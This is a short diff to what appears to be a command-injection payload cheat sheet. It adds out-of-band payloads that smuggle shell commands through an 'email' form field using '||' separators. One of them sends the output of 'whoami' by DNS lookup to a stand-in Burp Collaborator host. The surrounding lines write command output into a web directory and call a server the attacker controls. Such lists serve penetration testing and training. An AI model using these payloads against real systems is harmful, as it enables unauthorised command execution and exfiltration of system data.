@@ -126,7 +126,10 @@ email=||whoami>/var/www/images/output.txt||
 ### Out-of-band channel payloads
 
 #### Network Interaction
-
+```bash
+email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+```
 ```bash
 ; nslookup server-you-control ;
 ```
